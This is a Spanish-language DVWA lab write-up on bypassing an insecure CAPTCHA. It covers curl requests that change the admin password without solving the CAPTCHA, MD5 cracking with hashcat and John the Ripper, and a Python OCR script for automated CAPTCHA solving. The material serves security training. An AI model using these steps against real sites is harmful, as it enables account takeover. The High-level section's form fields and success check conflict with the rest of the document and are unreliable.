# Insecure CAPTCHA - DVWA

## 📌 Descripción
El módulo **Insecure CAPTCHA** de DVWA simula un sistema de registro/login protegido con un CAPTCHA.  
El objetivo es mostrar cómo, si el CAPTCHA está mal implementado (validación en cliente o tokens reutilizables), puede ser **bypasseado fácilmente**, permitiendo a un atacante automatizar acciones o eludir restricciones.

---

## 🎯 Objetivos de Aprendizaje

- Comprender el propósito de los CAPTCHAs en aplicaciones web: evitar automatización y bots.
- Identificar las debilidades comunes en su implementación:
  - Validación en cliente (JavaScript).
  - Tokens estáticos o reutilizables.
  - Ausencia de verificación en el servidor. 
- Aprender a realizar ataques de bypass:
  - Manipulación de peticiones HTTP (request).
  - Reutilización de CAPTCHA válido.
  - Automatización con herramientas como cURL, scripts o Burp Suite.

---

## 🔧 Requisitos Previos

- Tener DVWA en ejecución.
- Usuario autenticado en la aplicación.
- Seguridad en DVWA configurada en **Low, Medium y High** para practicar las diferencias.
- Herramientas recomendadas:
  - Navegador con inspector (F12).
  - `curl` o `Burp Suite` para manipular peticiones.

---

## 🐣 Nivel Low

### ✔️ Análisis Técnico

En este nivel, el CAPTCHA se valida únicamente en **cliente (JavaScript)** o con un **token fijo** que no cambia.  
Esto significa que podemos omitir el campo CAPTCHA al enviar el formulario pudiendo:

- No se valida en el servidor.
- El CAPTCHA es un reCAPTCHA de Google, pero ***no tiene clave API***, por lo que ***no se carga ni funciona***.
- El formulario está oculto `(style="display:none;")`, lo que indica que no está pensado para ser usado directamente.
- El campo `captcha` puede ser ***omitido o rellenado con cualquier valor*** sin afectar al resultado.

Esto permite a un atacante ***automatizar el envío del formulario sin preocuparse por el CAPTCHA***.


### ✔️ Pasos para el bypass

1. Acceder a la página **Insecure CAPTCHA** en DVWA desde el menú lateral.
2. Observar que pide usuario, contraseña y CAPTCHA.
3. Abrir el **Inspector del navegador** y ver el código HTML/JS.
4. Verificar que el CAPTCHA no tiene clave `(data-sitekey='')` y que el formulario está oculto.
5. Identificar los campos del formulario:
   - step=1
   - password_new
   - password_conf
   - Change
6. Enviar la petición manualmente con la herramienta `curl`:

```bash
curl -X POST "http://127.0.0.1:8080/vulnerabilities/captcha/" \
--cookie "PHPSESSID=a5g81mtd01urtujoif7ffo6st6; security=low" \
--data "step=2&password_new=nueva123&password_conf=nueva123&Change=Change"
```

#### 🧠 Explicación comando y uso

##### Lógica del backend PHP (low.php)

El archivo low.php (cada vulnerabilidad de DVWA tiene su propio archivo backend situado en la esquina inferior izquierda) contiene dos bloques principales:

###### 🥇 Paso 1 (step=1) 

```php
if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '1' ) ) {
    // Verifica el CAPTCHA (aunque esté roto)
    // Si pasa, muestra un nuevo formulario oculto con step=2
}
```

- El CAPTCHA se verifica con `recaptcha_check_answer(...)`, pero ***falla por falta de clave API***.
- Si se omite este paso (como es el caso del comando curl superior), el backend no ejecuta ningún cambio.

###### 🥈 Paso 2 (step=2)

```php
if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '2' ) ) {
    // Compara las contraseñas
    // Aplica md5() a la nueva contraseña
    // Ejecuta un UPDATE en la base de datos
}
```

- Este bloque ***actualiza la contraseña directamente*** en la tabla `users`.
- Usa `dvwaCurrentUser()` para identificar al usuario actual (en este caso, admin).
- La contraseña se guarda como `md5($pass_new)`.

#### ✅ Resultado:

<img width="936" height="30" alt="imagen" src="https://github.com/user-attachments/assets/ffa2add7-0d4d-4bab-8d81-d3050b3dcea5" />

Este mensaje confirma que el CAPTCHA ***no está operativo***, lo que valida que el sistema ***no está protegiendo el formulario*** como debería.

<img width="624" height="226" alt="imagen" src="https://github.com/user-attachments/assets/e3b1ab90-d60a-46f9-a0bf-9dfda3fcac2a" />

Esto muestra que el CAPTCHA está presente visualmente, pero ***no funcional ni validado***.

#### 🔐 Objetivo logrado

Aunque en el resultado que nos arroja la herramienta curl anteriormente no se encuentra la información de que la contraseña ha sido cambiada, al salir de la sesión de DVWA y volver a iniciar sesión, probamos con el usuario admin y la nueva contraseña: nueva123, donde comprobamos que la contraseña fue cambiada.

- Cambio de contraseña del usuario admin ***sin resolver el CAPTCHA***.
- El sistema no valida el CAPTCHA en el backend, lo que permite ***bypassear la protección*** enviando directamente el segundo paso del formulario.

## 📚 Información extra que merece documentarse

- **Importancia de validar en el backend:** El CAPTCHA puede estar presente en el frontend, pero si no se valida en el servidor, es inútil.
- **Saltarse el flujo lógico:** Enviar directamente step=2 demuestra que el servidor no protege la secuencia del formulario.
- **Automatización con curl:** Permite simular peticiones sin usar el navegador, ideal para pentesting.
- **Confirmación por hash:** Verificar el cambio directamente en la base de datos es más fiable que depender del HTML.

## 📘 Glosario técnico – Módulo Insecure CAPTCHA (Low)

| 🧠 Término              | 📖 Definición                                                                 |
|------------------------|------------------------------------------------------------------------------|
| CAPTCHA                | Sistema para distinguir humanos de bots. En DVWA está mal implementado.      |
| Bypass                 | Técnica para saltarse validaciones. Aquí se evita el CAPTCHA enviando `step=2`. |
| curl                   | Herramienta CLI para enviar peticiones HTTP. Útil para automatizar ataques. |
| md5()                  | Función hash que convierte texto en un valor hexadecimal de 32 caracteres.  |
| PHPSESSID              | Cookie que identifica la sesión del usuario en DVWA.                         |
| Backend                | Lógica del servidor. En este módulo, el archivo `low.php` gestiona el cambio. |
| dvwaCurrentUser()      | Función que devuelve el usuario autenticado en DVWA.                         |
| $_POST                 | Variable PHP que contiene los datos enviados por el formulario.              |
| SQL Injection          | Técnica para manipular consultas SQL. No se explota aquí, pero se menciona. |
| Hash MD5               | Representación cifrada de una contraseña. Ejemplo: `0192023a7bbd...`         |
| step=1 / step=2        | Parámetro que controla el flujo del formulario. `step=2` ejecuta el cambio. |
| Change=Change          | Par clave-valor que activa la lógica del formulario en el backend.           |
| Evidencia              | Capturas que demuestran el fallo: HTML oculto, error CAPTCHA, login exitoso.|
| Falla lógica. |        | Error en la secuencia de validaciones que permite saltarse protecciones.    |
| Validación condicional. | | Verificación que depende de un paso anterior. Si no se repite, puede fallar |
| Flujo de formulario | Secuencia de pasos que sigue el usuario. Aquí se salta el paso del CAPTCHA. | 

## 🧩 Insecure CAPTCHA – Nivel Medium (DVWA)

### 📌 Descripción

En el nivel Medium, DVWA introduce una validación real del CAPTCHA en el backend. Sin embargo, existe una falla lógica: el CAPTCHA solo se verifica en el primer paso (step=1), pero no se revalida en el segundo paso (step=2), lo que permite a un atacante bypassear la protección enviando directamente el segundo paso

### 🎯 Objetivo

- Cambiar contraseña del usuario `admin` sin resolver correctamente el CAPTCHA.
- Aprovechar la falta de validación en `step=2` para automatizar el ataque.

### 🔧 Requisitos

- DVWA corriendo en http://127.0.0.1:8080/
- Usuario autenticado (admin)
- Nivel de seguridad configurado en Medium
- Herramientas:
  - Navegador con inspector (F12)
  - curl para enviar peticiones manuales
  - Acceso a la base de datos MySQL para verificar el cambio

### 🧠 Lógica del backend PHP (medium.php)

#### 🥇 Paso 1 (step=1)

```php
if( isset( $_POST[ 'Change' ] ) && $_POST[ 'step' ] == '1' ) {
    // Verifica el CAPTCHA usando reCAPTCHA
    // Si es correcto, muestra el formulario oculto con step=2
}
```


<img width="553" height="98" alt="imagen" src="https://github.com/user-attachments/assets/e96fd300-dcc5-4897-b1b4-11f53ebf2c22" />


- Aquí ***sí se valida el CAPTCHA*** con `recaptcha_check_answer(...)`.
- Si el CAPTCHA falla, no se muestra el segundo formulario. Sin embargo, si se supera, muestra el formulario con el step 2.

#### 🥈 Paso 2 (step=2)

```php
if( isset( $_POST[ 'Change' ] ) && $_POST[ 'step' ] == '2' ) {
    // Compara las contraseñas
    // Aplica md5() a la nueva contraseña
    // Ejecuta un UPDATE en la base de datos
}
```


<img width="583" height="261" alt="imagen" src="https://github.com/user-attachments/assets/a3a7a955-18ee-495e-9de8-7498a8543940" />


- Este bloque ***no vuelve a verificar el CAPTCHA***.
- Si el atacante ***envía directamente `step=2`,*** se ejecuta el cambio de contraseña sin pasar por el CAPTCHA.

### 🧪 Comando curl para vulnerar

```bash
curl -X POST "http://127.0.0.1:8080/vulnerabilities/captcha/" \
--cookie "PHPSESSID=TU_SESION; security=medium" \
--header "Content-Type: application/x-www-form-urlencoded" \
--data "step=2&password_new=nueva123&password_conf=nueva123&Change=Change"
```

Este comando omite el CAPTCHA y ejecuta directamente el cambio de contraseña.

Sustituye TU_SESION por tu valor real de sesión. DVWA no valida que hayas pasado por step=1, así que el backend ejecuta el cambio directamente.


<img width="948" height="33" alt="imagen" src="https://github.com/user-attachments/assets/5f00b5c3-f7af-455e-83b4-4ef2a62d2f99" />


Mensaje de error del Captcha en la respueta a nuestro comando ejecutado.

### 🧬 Verificación en la base de datos desde el contenedor Docker: DVWA

1. Verificamos el nombre del contenedor en el que trabajamos:

```bash
docker ps
```

```codigo
CONTAINER ID   IMAGE                  COMMAND      CREATED      STATUS          PORTS                                   NAMES
9297528d943f   vulnerables/web-dvwa   "/main.sh"   5 days ago   Up 25 minutes   0.0.0.0:8080->80/tcp, :::8080->80/tcp   dvwa
```

2. Accedemos al contenedor

```bash
docker exec -it dvwa bash
```

Esto nos mete dentro del contenedor como si fuera una máquina virtual.

3. Accedemos a MySQL desde dentro del contenedor

```bash
mysql -u root -p
```

Ponemos nuestro usuario y contraseña.

4. Consultamos la base de datos dvwa:

```sql
USE dvwa;
SELECT user, password FROM users WHERE user = 'admin';
```

5. Nos muestra el hash en formato MD5, que es el algoritmo por defecto en DVWA para almacenar contraseñas en niveles bajo de seguridad.

```codigo
Database changed
MariaDB [dvwa]> SELECT user, password FROM users WHERE user = 'admin';
+-------+----------------------------------+
| user  | password                         |
+-------+----------------------------------+
| admin | c9f7aa4e8534617f2413501aa1c32333 |
+-------+------------------
```

6. Intentamos crackearla con herramientas como:

#### 🧨 1. hashcat

```bash
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

Donde hash.txt contiene solo el hash.

#### 🧨 2. john the ripper

```bash
echo "c9f7aa4e8534617f2413501aa1c32333" > hash.txt
john --format=raw-md5 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

<img width="845" height="218" alt="imagen" src="https://github.com/user-attachments/assets/cf91a22d-5aed-462e-8e8b-986a33615934" />

Y, como nos muestra la herramienta, vemos que hemos modificado la contraseña a nueva123 y el hash que obtenimos nos lo muestra también.

### 📚 Información extra para documentar

- **Falla lógica de validación:** Aunque el CAPTCHA se valida en el primer paso, no se verifica en el segundo, lo que permite el bypass.
- **Importancia de validar en cada paso crítico:** El backend debe verificar que el CAPTCHA fue superado antes de ejecutar acciones sensibles.
- **Simulación de flujo con curl:** Permite saltarse el frontend y enviar peticiones directas al servidor.
- **Confirmación por hash:** Verificar el cambio en la base de datos es esencial para confirmar la explotación.

## 🧩 Insecure CAPTCHA – Nivel High (DVWA)

En el nivel High, DVWA implementa:

- Un CAPTCHA que se ***genera dinámicamente*** y se valida en el servidor.
- Un sistema que ***verifica sesión y tokens***.
- Posible uso de ***cookies o tokens CSRF*** para evitar automatización.

### 🧭 Paso a paso para vulnerarlo

#### 1. 🔍 Inspecciona el formulario

Desde la interfaz web:

- Vamos a **Insecure CAPTCHA**.
- Observa el formulario: campos de usuario, contraseña, CAPTCHA
- Abre las herramientas de desarrollador (F12) y revisa el HTML

Buscamos:

- El 'src' de la imagen CAPTCHA (ej. captcha.php).
- Si hay algún `token` oculto (`<input type="hidden" name="user_token" value="...">`).

#### 2. 🕵️‍♂️ Intercepta con Burp Suite

Hacemos una petición manual con credenciales falsas y capturamos la solicitud en Burp:

```Http
POST /vulnerabilities/captcha/ HTTP/1.1
Host: localhost:8080
...
username=admin&password=123456&captcha=ABCD&user_token=xyz
```

Esto nos permite ver:

- Cómo se envía el CAPTCHA.
- Si el `user_token` cambia en cada carga.
- Qué cookies se usan.

#### 3. 🧠 Automatiza el ataque con Python + OCR

Aquí viene lo divertido: automatizar el reconocimiento del CAPTCHA y enviar la petición. Este script básico te servirá de base:

```Python
import requests
from bs4 import BeautifulSoup
from PIL import Image
import pytesseract
from io import BytesIO

# Inicia sesión
session = requests.Session()
url = "http://localhost:8080/vulnerabilities/captcha/"

# Obtiene la página
r = session.get(url)
soup = BeautifulSoup(r.text, "html.parser")

# Extrae el token
token = soup.find("input", {"name": "user_token"})["value"]

# Extrae la imagen del CAPTCHA
captcha_img_url = "http://localhost:8080/" + soup.find("img")["src"]
captcha_img = session.get(captcha_img_url)
captcha_code = pytesseract.image_to_string(Image.open(BytesIO(captcha_img.content))).strip()

# Envía la petición
payload = {
    "username": "admin",
    "password": "nueva123",
    "captcha": captcha_code,
    "user_token": token
}
response = session.post(url, data=payload)

# Verifica si fue exitoso
if "Welcome to the password protected area" in response.text:
    print("[+] Login exitoso")
else:
    print("[-] Falló el login")
```

💡 Puedes mejorar el OCR aplicando filtros a la imagen (blanco y negro, contraste, etc.) para aumentar la precisión.

#### 4. 🧪 Repite el ciclo

Cada vez que hagas una petición, el CAPTCHA y el token cambian. Así que el script debe:

- Obtener la página.
- Extraer el nuevo CAPTCHA.
- Enviar la petición.

### 🧠 ¿Qué estás aprendiendo aquí?

- Cómo romper CAPTCHA básicos con OCR
- Cómo manejar tokens dinámicos
- Cómo automatizar ataques respetando sesiones y cookies
